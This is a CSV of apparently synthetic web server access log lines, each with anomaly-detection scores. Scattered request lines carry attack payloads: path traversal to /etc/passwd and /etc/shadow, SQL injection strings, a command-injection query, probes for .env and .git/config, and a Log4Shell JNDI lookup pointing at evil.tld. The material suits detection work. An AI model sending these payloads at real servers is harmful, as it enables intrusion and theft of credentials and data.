score_content,score_session,score_fused,score_fused_norm,line
30123.6953125,,30123.6953125,30123.6953125,194.111.26.143 - - [10/Jan/2025:12:43:01 +0000] "PUT /login HTTP/1.1" 403 1119 "-" "python-requests/2.31.0"
26.54376983642578,,26.54376983642578,26.54376983642578,159.83.223.8 - - [10/Jan/2025:12:43:03 +0000] "GET /api/product?id=123 HTTP/1.1" 304 1474 "https://example.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
69.41100311279297,,69.41100311279297,69.41100311279297,153.84.163.205 - - [10/Jan/2025:12:43:03 +0000] "HEAD /search?q=phone HTTP/1.1" 200 2200 "-" "curl/7.85.0"
0.35080236196517944,,0.35080236196517944,0.35080236196517944,139.238.144.94 - - [10/Jan/2025:12:43:05 +0000] "GET /index.html HTTP/1.1" 200 14746 "https://news.ycombinator.com/" "curl/7.85.0"
27.522703170776367,,27.522703170776367,27.522703170776367,185.243.223.239 - - [10/Jan/2025:12:43:05 +0000] "DELETE /server-status HTTP/1.1" 200 2280 "https://example.com/" "nikto/2.5.0"
30123.60546875,,30123.60546875,30123.60546875,245.129.43.208 - - [10/Jan/2025:12:43:08 +0000] "PUT /admin HTTP/1.1" 401 1440 "-" "dirb/2.22"
0.23695529997348785,,0.23695529997348785,0.23695529997348785,136.72.140.106 - - [10/Jan/2025:12:43:08 +0000] "GET /assets/app.css HTTP/1.1" 200 11914 "https://news.ycombinator.com/" "curl/7.85.0"
2.2064366340637207,,2.2064366340637207,2.2064366340637207,150.221.132.180 - - [10/Jan/2025:12:43:10 +0000] "GET / HTTP/1.1" 200 10502 "https://twitter.com/" "Wget/1.21.2 (linux-gnu)"
30205.69921875,,30205.69921875,30205.69921875,85.97.192.100 - - [10/Jan/2025:12:43:12 +0000] "OPTIONS /search?q=ssd HTTP/1.1" 400 314 "https://www.google.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
26.48480987548828,,26.48480987548828,26.48480987548828,131.9.246.182 - - [10/Jan/2025:12:43:13 +0000] "POST /search?q=camera HTTP/1.1" 200 10426 "https://twitter.com/" "sqlmap/1.7.2#stable"
73.56226348876953,,73.56226348876953,73.56226348876953,241.51.187.84 - - [10/Jan/2025:12:43:14 +0000] "OPTIONS /about HTTP/1.1" 200 12844 "https://example.com/" "dirb/2.22"
4.855103492736816,,4.855103492736816,4.855103492736816,70.31.40.117 - - [10/Jan/2025:12:43:15 +0000] "POST /contact HTTP/1.1" 200 18602 "https://example.com/" "sqlmap/1.7.2#stable"
0.28676801919937134,,0.28676801919937134,0.28676801919937134,65.3.122.58 - - [10/Jan/2025:12:43:16 +0000] "GET /assets/app.js HTTP/1.1" 200 19801 "-" "curl/7.85.0"
126.6324691772461,,126.6324691772461,126.6324691772461,172.15.101.170 - - [10/Jan/2025:12:43:19 +0000] "TRACE /search?q=ssd HTTP/1.1" 200 1020 "https://www.google.com/" "sqlmap/1.7.2#stable"
4.91761589050293,,4.91761589050293,4.91761589050293,39.219.232.235 - - [10/Jan/2025:12:43:22 +0000] "POST /login HTTP/1.1" 200 15771 "https://www.google.com/" "nikto/2.5.0"
27.802289962768555,,27.802289962768555,27.802289962768555,158.115.79.4 - - [10/Jan/2025:12:43:22 +0000] "DELETE /logout HTTP/1.1" 200 19474 "-" "python-requests/2.31.0"
49.3645133972168,,49.3645133972168,49.3645133972168,237.37.169.137 - - [10/Jan/2025:12:43:22 +0000] "DELETE /search?q=monitor HTTP/1.1" 200 5161 "https://news.ycombinator.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
49.42787170410156,,49.42787170410156,49.42787170410156,225.195.140.191 - - [10/Jan/2025:12:43:22 +0000] "DELETE /search?q=router HTTP/1.1" 200 15541 "https://twitter.com/" "dirb/2.22"
2.0171926021575928,,2.0171926021575928,2.0171926021575928,44.65.194.92 - - [10/Jan/2025:12:43:25 +0000] "GET /login HTTP/1.1" 200 15904 "https://news.ycombinator.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
0.2501905858516693,,0.2501905858516693,0.2501905858516693,199.43.84.35 - - [10/Jan/2025:12:43:26 +0000] "GET /assets/app.css HTTP/1.1" 200 15581 "https://www.google.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
29.387611389160156,,29.387611389160156,29.387611389160156,25.225.152.95 - - [10/Jan/2025:12:43:26 +0000] "POST /search?q=camera HTTP/1.1" 301 5257 "https://news.ycombinator.com/" "curl/7.85.0"
29.4486026763916,,29.4486026763916,29.4486026763916,52.124.184.50 - - [10/Jan/2025:12:43:28 +0000] "POST /search?q=router HTTP/1.1" 304 5399 "https://twitter.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
47.66838073730469,,47.66838073730469,47.66838073730469,154.22.209.76 - - [10/Jan/2025:12:43:30 +0000] "HEAD /api/products HTTP/1.1" 200 9096 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
45.93959045410156,,45.93959045410156,45.93959045410156,116.229.27.74 - - [10/Jan/2025:12:43:33 +0000] "HEAD /..%2f..%2fetc%2fpasswd HTTP/1.1" 200 7799 "-" "sqlmap/1.7.2#stable"
76.39380645751953,,76.39380645751953,76.39380645751953,27.25.4.166 - - [10/Jan/2025:12:43:35 +0000] "OPTIONS /phpmyadmin HTTP/1.1" 304 13709 "-" "dirb/2.22"
26.5318546295166,,26.5318546295166,26.5318546295166,229.189.205.222 - - [10/Jan/2025:12:43:35 +0000] "GET /search?q=laptop HTTP/1.1" 304 2103 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
26.38475227355957,,26.38475227355957,26.38475227355957,151.100.109.71 - - [10/Jan/2025:12:43:38 +0000] "POST /search?q=headphones HTTP/1.1" 200 3959 "-" "Wget/1.21.2 (linux-gnu)"
69.39437866210938,,69.39437866210938,69.39437866210938,196.103.22.69 - - [10/Jan/2025:12:43:40 +0000] "HEAD /search?q=laptop HTTP/1.1" 200 802 "https://news.ycombinator.com/" "dirb/2.22"
11.80037784576416,,11.80037784576416,11.80037784576416,187.117.72.197 - - [10/Jan/2025:12:43:40 +0000] "PUT /wp-login.php HTTP/1.1" 200 12746 "https://news.ycombinator.com/" "sqlmap/1.7.2#stable"
47.76007080078125,,47.76007080078125,47.76007080078125,223.140.56.5 - - [10/Jan/2025:12:43:41 +0000] "HEAD /profile HTTP/1.1" 200 11514 "https://www.google.com/" "nikto/2.5.0"
95.1542739868164,,95.1542739868164,95.1542739868164,228.101.195.231 - - [10/Jan/2025:12:43:41 +0000] "OPTIONS /search?q=monitor HTTP/1.1" 200 14195 "https://www.google.com/" "nikto/2.5.0"
23.506685256958008,,23.506685256958008,23.506685256958008,110.139.102.30 - - [10/Jan/2025:12:43:41 +0000] "GET /search?q=headphones HTTP/1.1" 200 8856 "https://www.google.com/" "sqlmap/1.7.2#stable"
30.627178192138672,,30.627178192138672,30.627178192138672,82.130.141.86 - - [10/Jan/2025:12:43:43 +0000] "DELETE /dashboard HTTP/1.1" 301 18281 "https://example.com/" "python-requests/2.31.0"
13.3161039352417,,13.3161039352417,13.3161039352417,186.20.216.25 - - [10/Jan/2025:12:43:44 +0000] "PUT /api/products HTTP/1.1" 200 4711 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
38.06382751464844,,38.06382751464844,38.06382751464844,90.78.128.20 - - [10/Jan/2025:12:43:44 +0000] "PUT /search?q=phone HTTP/1.1" 302 9010 "https://news.ycombinator.com/" "nikto/2.5.0"
30111.01171875,,30111.01171875,30111.01171875,97.11.118.91 - - [10/Jan/2025:12:43:46 +0000] "GET /assets/app.js HTTP/1.1" 401 22 "https://www.google.com/" "nikto/2.5.0"
30123.60546875,,30123.60546875,30123.60546875,145.95.152.152 - - [10/Jan/2025:12:43:47 +0000] "PUT /contact HTTP/1.1" 401 235 "https://news.ycombinator.com/" "python-requests/2.31.0"
49.281959533691406,,49.281959533691406,49.281959533691406,180.45.108.174 - - [10/Jan/2025:12:43:47 +0000] "DELETE /search?q=%27+OR+1%3D1+-- HTTP/1.1" 200 8155 "https://twitter.com/" "curl/7.85.0"
104.953125,,104.953125,104.953125,83.21.76.247 - - [10/Jan/2025:12:43:49 +0000] "TRACE /login HTTP/1.1" 200 3620 "https://www.google.com/" "dirb/2.22"
49.36919021606445,,49.36919021606445,49.36919021606445,185.105.221.166 - - [10/Jan/2025:12:43:51 +0000] "DELETE /search?q=camera HTTP/1.1" 200 1965 "https://news.ycombinator.com/" "python-requests/2.31.0"
129.54296875,,129.54296875,129.54296875,80.222.61.24 - - [10/Jan/2025:12:43:51 +0000] "TRACE /search?q=headphones HTTP/1.1" 304 13217 "https://news.ycombinator.com/" "nikto/2.5.0"
1.967105507850647,,1.967105507850647,1.967105507850647,64.18.84.143 - - [10/Jan/2025:12:43:51 +0000] "GET /login HTTP/1.1" 201 4547 "https://twitter.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
4.8456339836120605,,4.8456339836120605,4.8456339836120605,249.16.15.115 - - [10/Jan/2025:12:43:52 +0000] "POST /logout HTTP/1.1" 200 7060 "https://www.google.com/" "sqlmap/1.7.2#stable"
30179.966796875,,30179.966796875,30179.966796875,205.146.198.230 - - [10/Jan/2025:12:43:55 +0000] "HEAD /api/user?id=1;DROP TABLE users HTTP/1.1" 401 671 "https://example.com/" "nikto/2.5.0"
27.66105842590332,,27.66105842590332,27.66105842590332,59.239.224.4 - - [10/Jan/2025:12:43:56 +0000] "DELETE /dashboard HTTP/1.1" 200 8152 "-" "python-requests/2.31.0"
69.38197326660156,,69.38197326660156,69.38197326660156,188.13.34.202 - - [10/Jan/2025:12:43:59 +0000] "HEAD /search?q=monitor HTTP/1.1" 200 4692 "https://www.google.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
1.8933757543563843,,1.8933757543563843,1.8933757543563843,87.192.169.24 - - [10/Jan/2025:12:44:01 +0000] "GET /contact HTTP/1.1" 200 655 "https://news.ycombinator.com/" "curl/7.85.0"
126.65286254882812,,126.65286254882812,126.65286254882812,8.208.134.149 - - [10/Jan/2025:12:44:04 +0000] "TRACE /search?q=phone HTTP/1.1" 200 19246 "https://twitter.com/" "curl/7.85.0"
95.14309692382812,,95.14309692382812,95.14309692382812,141.253.154.125 - - [10/Jan/2025:12:44:06 +0000] "OPTIONS /search?q=camera HTTP/1.1" 200 393 "https://example.com/" "sqlmap/1.7.2#stable"
13.476553916931152,,13.476553916931152,13.476553916931152,164.236.108.143 - - [10/Jan/2025:12:44:09 +0000] "PUT /about HTTP/1.1" 200 410 "https://example.com/" "sqlmap/1.7.2#stable"
47.76795959472656,,47.76795959472656,47.76795959472656,23.118.109.6 - - [10/Jan/2025:12:44:10 +0000] "HEAD /logout HTTP/1.1" 200 467 "https://twitter.com/" "sqlmap/1.7.2#stable"
47.83292007446289,,47.83292007446289,47.83292007446289,169.141.98.232 - - [10/Jan/2025:12:44:13 +0000] "HEAD /about HTTP/1.1" 200 11883 "-" "python-requests/2.31.0"
3.2402052879333496,,3.2402052879333496,3.2402052879333496,236.61.7.83 - - [10/Jan/2025:12:44:13 +0000] "POST /.git/config HTTP/1.1" 200 19211 "-" "python-requests/2.31.0"
30134.283203125,,30134.283203125,30134.283203125,144.217.107.228 - - [10/Jan/2025:12:44:15 +0000] "GET /search?q=headphones HTTP/1.1" 403 1499 "https://twitter.com/" "curl/7.85.0"
27.733348846435547,,27.733348846435547,27.733348846435547,112.2.149.51 - - [10/Jan/2025:12:44:17 +0000] "DELETE /logout HTTP/1.1" 200 2670 "https://example.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
47.57626724243164,,47.57626724243164,47.57626724243164,208.46.19.141 - - [10/Jan/2025:12:44:18 +0000] "HEAD /server-status HTTP/1.1" 200 9118 "https://news.ycombinator.com/" "nikto/2.5.0"
38.00845718383789,,38.00845718383789,38.00845718383789,181.106.253.248 - - [10/Jan/2025:12:44:21 +0000] "PUT /search?q=camera HTTP/1.1" 302 1735 "-" "Wget/1.21.2 (linux-gnu)"
49.402523040771484,,49.402523040771484,49.402523040771484,96.20.6.31 - - [10/Jan/2025:12:44:23 +0000] "DELETE /api/product?id=123 HTTP/1.1" 200 6147 "https://www.google.com/" "sqlmap/1.7.2#stable"
2.9671950340270996,,2.9671950340270996,2.9671950340270996,250.94.122.254 - - [10/Jan/2025:12:44:23 +0000] "POST /..%2f..%2fetc%2fpasswd HTTP/1.1" 204 2962 "https://www.google.com/" "dirb/2.22"
26.474567413330078,,26.474567413330078,26.474567413330078,14.236.44.152 - - [10/Jan/2025:12:44:25 +0000] "POST /search?q=monitor HTTP/1.1" 200 12883 "https://news.ycombinator.com/" "curl/7.85.0"
30134.20703125,,30134.20703125,30134.20703125,17.80.217.35 - - [10/Jan/2025:12:44:28 +0000] "GET /search?q=camera HTTP/1.1" 400 1104 "https://example.com/" "nikto/2.5.0"
30112.248046875,,30112.248046875,30112.248046875,191.108.62.110 - - [10/Jan/2025:12:44:31 +0000] "GET /profile HTTP/1.1" 404 1147 "https://news.ycombinator.com/" "sqlmap/1.7.2#stable"
95.10037231445312,,95.10037231445312,95.10037231445312,105.44.106.243 - - [10/Jan/2025:12:44:31 +0000] "OPTIONS /api/run?cmd=cat+%2Fetc%2Fpasswd HTTP/1.1" 200 7544 "-" "dirb/2.22"
7.6851115226745605,,7.6851115226745605,7.6851115226745605,230.107.73.17 - - [10/Jan/2025:12:44:31 +0000] "POST /dashboard HTTP/1.1" 301 11507 "https://example.com/" "nikto/2.5.0"
104.8377914428711,,104.8377914428711,104.8377914428711,162.6.180.160 - - [10/Jan/2025:12:44:34 +0000] "TRACE /api/products HTTP/1.1" 200 11576 "https://news.ycombinator.com/" "Wget/1.21.2 (linux-gnu)"
2.2181167602539062,,2.2181167602539062,2.2181167602539062,88.161.227.247 - - [10/Jan/2025:12:44:37 +0000] "GET / HTTP/1.1" 204 15089 "https://twitter.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
47.799739837646484,,47.799739837646484,47.799739837646484,54.233.88.122 - - [10/Jan/2025:12:44:39 +0000] "HEAD /logout HTTP/1.1" 200 12759 "-" "Wget/1.21.2 (linux-gnu)"
35.124942779541016,,35.124942779541016,35.124942779541016,54.251.155.39 - - [10/Jan/2025:12:44:40 +0000] "PUT /search?q=camera HTTP/1.1" 200 18761 "https://news.ycombinator.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
126.5991439819336,,126.5991439819336,126.5991439819336,68.52.19.123 - - [10/Jan/2025:12:44:43 +0000] "TRACE /api/product?id=123 HTTP/1.1" 200 7352 "https://www.google.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
69.38838195800781,,69.38838195800781,69.38838195800781,116.163.87.138 - - [10/Jan/2025:12:44:46 +0000] "HEAD /api/run?cmd=cat+%2Fetc%2Fpasswd HTTP/1.1" 200 11750 "https://www.google.com/" "nikto/2.5.0"
23.594690322875977,,23.594690322875977,23.594690322875977,231.49.175.108 - - [10/Jan/2025:12:44:48 +0000] "GET /search?q=camera HTTP/1.1" 200 13527 "https://news.ycombinator.com/" "curl/7.85.0"
47.63166809082031,,47.63166809082031,47.63166809082031,204.26.26.69 - - [10/Jan/2025:12:44:50 +0000] "HEAD /phpmyadmin HTTP/1.1" 200 4245 "https://twitter.com/" "dirb/2.22"
104.91651153564453,,104.91651153564453,104.91651153564453,35.65.8.165 - - [10/Jan/2025:12:44:52 +0000] "TRACE /logout HTTP/1.1" 200 3580 "https://news.ycombinator.com/" "nikto/2.5.0"
30112.443359375,,30112.443359375,30112.443359375,148.193.168.150 - - [10/Jan/2025:12:44:55 +0000] "GET / HTTP/1.1" 403 1073 "https://twitter.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
0.1017078161239624,,0.1017078161239624,0.1017078161239624,194.169.251.70 - - [10/Jan/2025:12:44:56 +0000] "GET /..%2f..%2fetc%2fpasswd HTTP/1.1" 200 9678 "https://news.ycombinator.com/" "dirb/2.22"
6.350574970245361,,6.350574970245361,6.350574970245361,66.166.141.15 - - [10/Jan/2025:12:44:59 +0000] "POST /.env HTTP/1.1" 302 3875 "https://www.google.com/" "curl/7.85.0"
13.388762474060059,,13.388762474060059,13.388762474060059,113.12.122.49 - - [10/Jan/2025:12:45:00 +0000] "PUT /profile HTTP/1.1" 200 2962 "https://news.ycombinator.com/" "sqlmap/1.7.2#stable"
73.34617614746094,,73.34617614746094,73.34617614746094,253.252.192.58 - - [10/Jan/2025:12:45:00 +0000] "OPTIONS /phpmyadmin HTTP/1.1" 201 2223 "https://example.com/" "nikto/2.5.0"
49.40095520019531,,49.40095520019531,49.40095520019531,114.164.36.56 - - [10/Jan/2025:12:45:00 +0000] "DELETE /api/product?id=123 HTTP/1.1" 200 5838 "https://www.google.com/" "nikto/2.5.0"
2.2386040687561035,,2.2386040687561035,2.2386040687561035,106.139.53.4 - - [10/Jan/2025:12:45:01 +0000] "GET / HTTP/1.1" 200 19782 "-" "dirb/2.22"
11137.599609375,,11137.599609375,11137.599609375,2.83.158.23 - - [10/Jan/2025:12:45:02 +0000] "OPTIONS /search?q=laptop HTTP/1.1" 500 712 "https://twitter.com/" "curl/7.85.0"
0.34906521439552307,,0.34906521439552307,0.34906521439552307,24.72.210.232 - - [10/Jan/2025:12:45:03 +0000] "GET /index.html HTTP/1.1" 200 14250 "https://www.google.com/" "nikto/2.5.0"
0.2960832715034485,,0.2960832715034485,0.2960832715034485,205.135.9.66 - - [10/Jan/2025:12:45:06 +0000] "GET /index.html HTTP/1.1" 200 2377 "-" "nikto/2.5.0"
27.83312225341797,,27.83312225341797,27.83312225341797,73.150.50.190 - - [10/Jan/2025:12:45:09 +0000] "DELETE /admin HTTP/1.1" 200 17583 "https://www.google.com/" "dirb/2.22"
2.2325236797332764,,2.2325236797332764,2.2325236797332764,207.149.148.245 - - [10/Jan/2025:12:45:12 +0000] "GET / HTTP/1.1" 201 18332 "-" "sqlmap/1.7.2#stable"
4.98961877822876,,4.98961877822876,4.98961877822876,150.75.188.155 - - [10/Jan/2025:12:45:15 +0000] "GET /admin HTTP/1.1" 304 13915 "https://example.com/" "nikto/2.5.0"
4.7296857833862305,,4.7296857833862305,4.7296857833862305,185.134.169.170 - - [10/Jan/2025:12:45:17 +0000] "POST /api/products HTTP/1.1" 200 7108 "https://twitter.com/" "dirb/2.22"
69.50305938720703,,69.50305938720703,69.50305938720703,190.73.115.197 - - [10/Jan/2025:12:45:19 +0000] "HEAD /search?q=ssd HTTP/1.1" 200 11751 "https://example.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
30180.01171875,,30180.01171875,30180.01171875,148.180.173.84 - - [10/Jan/2025:12:45:19 +0000] "HEAD /search?q=%27+OR+1%3D1+-- HTTP/1.1" 403 308 "https://example.com/" "nikto/2.5.0"
47.818843841552734,,47.818843841552734,47.818843841552734,194.118.178.121 - - [10/Jan/2025:12:45:19 +0000] "HEAD /logout HTTP/1.1" 201 18958 "https://example.com/" "dirb/2.22"
47.856502532958984,,47.856502532958984,47.856502532958984,11.165.57.241 - - [10/Jan/2025:12:45:22 +0000] "HEAD /about HTTP/1.1" 200 18763 "https://example.com/" "curl/7.85.0"
71.72333526611328,,71.72333526611328,71.72333526611328,102.252.1.79 - - [10/Jan/2025:12:45:22 +0000] "OPTIONS /../../etc/passwd HTTP/1.1" 200 2257 "https://twitter.com/" "python-requests/2.31.0"
27.617658615112305,,27.617658615112305,27.617658615112305,127.253.232.16 - - [10/Jan/2025:12:45:24 +0000] "DELETE /api/products HTTP/1.1" 200 886 "https://twitter.com/" "curl/7.85.0"
126.62995910644531,,126.62995910644531,126.62995910644531,216.187.108.57 - - [10/Jan/2025:12:45:25 +0000] "TRACE /search?q=ssd HTTP/1.1" 200 1480 "https://example.com/" "python-requests/2.31.0"
35.02877426147461,,35.02877426147461,35.02877426147461,170.52.170.73 - - [10/Jan/2025:12:45:27 +0000] "PUT /search?q=headphones HTTP/1.1" 200 11041 "https://news.ycombinator.com/" "nikto/2.5.0"
95.1688232421875,,95.1688232421875,95.1688232421875,110.180.9.103 - - [10/Jan/2025:12:45:28 +0000] "OPTIONS /api/user?id=1;DROP TABLE users HTTP/1.1" 200 272 "https://twitter.com/" "python-requests/2.31.0"
3.1843183040618896,,3.1843183040618896,3.1843183040618896,213.221.106.74 - - [10/Jan/2025:12:45:31 +0000] "GET /assets/app.js HTTP/1.1" 301 13874 "https://www.google.com/" "python-requests/2.31.0"
4.769951343536377,,4.769951343536377,4.769951343536377,101.219.131.98 - - [10/Jan/2025:12:45:31 +0000] "GET /dashboard HTTP/1.1" 302 4364 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
3.2333734035491943,,3.2333734035491943,3.2333734035491943,28.159.13.47 - - [10/Jan/2025:12:45:31 +0000] "GET /assets/app.css HTTP/1.1" 304 17430 "https://example.com/" "curl/7.85.0"
29.404878616333008,,29.404878616333008,29.404878616333008,86.141.189.216 - - [10/Jan/2025:12:45:34 +0000] "POST /search?q=laptop HTTP/1.1" 302 4753 "https://twitter.com/" "nikto/2.5.0"
69.52922821044922,,69.52922821044922,69.52922821044922,28.29.206.195 - - [10/Jan/2025:12:45:36 +0000] "HEAD /search?q=ssd HTTP/1.1" 200 19477 "https://twitter.com/" "nikto/2.5.0"
95.17672729492188,,95.17672729492188,95.17672729492188,57.44.116.197 - - [10/Jan/2025:12:45:37 +0000] "OPTIONS /search?q=router HTTP/1.1" 200 15002 "https://www.google.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
73.47107696533203,,73.47107696533203,73.47107696533203,36.254.100.209 - - [10/Jan/2025:12:45:40 +0000] "OPTIONS /contact HTTP/1.1" 201 8439 "https://news.ycombinator.com/" "Wget/1.21.2 (linux-gnu)"
4.779963493347168,,4.779963493347168,4.779963493347168,103.130.218.78 - - [10/Jan/2025:12:45:43 +0000] "GET /dashboard HTTP/1.1" 301 10721 "https://twitter.com/" "curl/7.85.0"
23.433574676513672,,23.433574676513672,23.433574676513672,145.114.129.142 - - [10/Jan/2025:12:45:44 +0000] "GET /search?q=%27+OR+1%3D1+-- HTTP/1.1" 200 3849 "https://example.com/" "curl/7.85.0"
1.8031479120254517,,1.8031479120254517,1.8031479120254517,51.63.234.193 - - [10/Jan/2025:12:45:44 +0000] "GET /api/products HTTP/1.1" 200 1119 "-" "dirb/2.22"
49.42913818359375,,49.42913818359375,49.42913818359375,50.179.93.155 - - [10/Jan/2025:12:45:46 +0000] "DELETE /search?q=laptop HTTP/1.1" 200 15919 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
95.13235473632812,,95.13235473632812,95.13235473632812,110.107.113.166 - - [10/Jan/2025:12:45:47 +0000] "OPTIONS /api/product?id=123 HTTP/1.1" 200 2062 "-" "Wget/1.21.2 (linux-gnu)"
26.504289627075195,,26.504289627075195,26.504289627075195,238.120.64.186 - - [10/Jan/2025:12:45:48 +0000] "POST /search?q=camera HTTP/1.1" 200 15666 "https://twitter.com/" "curl/7.85.0"
27.764434814453125,,27.764434814453125,27.764434814453125,251.196.29.30 - - [10/Jan/2025:12:45:50 +0000] "DELETE /profile HTTP/1.1" 200 18501 "https://twitter.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
49.55478286743164,,49.55478286743164,49.55478286743164,64.108.76.61 - - [10/Jan/2025:12:45:51 +0000] "DELETE /?id=%24%7Bjndi%3Aldap%3A%2F%2Fevil.tld%2Fa%7D HTTP/1.1" 200 11998 "https://twitter.com/" "sqlmap/1.7.2#stable"
0.3065142333507538,,0.3065142333507538,0.3065142333507538,56.95.147.50 - - [10/Jan/2025:12:45:54 +0000] "GET /index.html HTTP/1.1" 200 4517 "https://news.ycombinator.com/" "sqlmap/1.7.2#stable"
26.483867645263672,,26.483867645263672,26.483867645263672,44.69.155.94 - - [10/Jan/2025:12:45:55 +0000] "POST /search?q=router HTTP/1.1" 200 10199 "https://www.google.com/" "curl/7.85.0"
71.87603759765625,,71.87603759765625,71.87603759765625,108.35.107.32 - - [10/Jan/2025:12:45:57 +0000] "OPTIONS /wp-login.php HTTP/1.1" 200 17335 "https://example.com/" "curl/7.85.0"
69.45181274414062,,69.45181274414062,69.45181274414062,176.36.103.253 - - [10/Jan/2025:12:45:58 +0000] "HEAD /search?q=laptop HTTP/1.1" 200 16779 "https://example.com/" "Wget/1.21.2 (linux-gnu)"
35.092926025390625,,35.092926025390625,35.092926025390625,75.151.54.56 - - [10/Jan/2025:12:46:01 +0000] "PUT /api/backup?file=../../../../etc/shadow HTTP/1.1" 200 1088 "https://www.google.com/" "curl/7.85.0"
49.433406829833984,,49.433406829833984,49.433406829833984,37.18.177.254 - - [10/Jan/2025:12:46:02 +0000] "DELETE /api/product?id=123 HTTP/1.1" 200 13345 "https://www.google.com/" "sqlmap/1.7.2#stable"
3.108051061630249,,3.108051061630249,3.108051061630249,228.124.200.3 - - [10/Jan/2025:12:46:02 +0000] "GET /assets/app.css HTTP/1.1" 301 1341 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
69.45586395263672,,69.45586395263672,69.45586395263672,95.90.247.218 - - [10/Jan/2025:12:46:02 +0000] "HEAD /api/product?id=123 HTTP/1.1" 200 14071 "https://twitter.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
23.594348907470703,,23.594348907470703,23.594348907470703,132.110.170.36 - - [10/Jan/2025:12:46:05 +0000] "GET /search?q=monitor HTTP/1.1" 200 19485 "https://www.google.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
72.36103057861328,,72.36103057861328,72.36103057861328,136.59.187.80 - - [10/Jan/2025:12:46:07 +0000] "HEAD /search?q=router HTTP/1.1" 302 4729 "https://twitter.com/" "curl/7.85.0"
129.65890502929688,,129.65890502929688,129.65890502929688,36.64.87.107 - - [10/Jan/2025:12:46:10 +0000] "TRACE /search?q=ssd HTTP/1.1" 304 7988 "https://www.google.com/" "curl/7.85.0"
103.21984100341797,,103.21984100341797,103.21984100341797,220.61.207.105 - - [10/Jan/2025:12:46:11 +0000] "TRACE /cgi-bin/test.cgi HTTP/1.1" 200 16219 "-" "nikto/2.5.0"
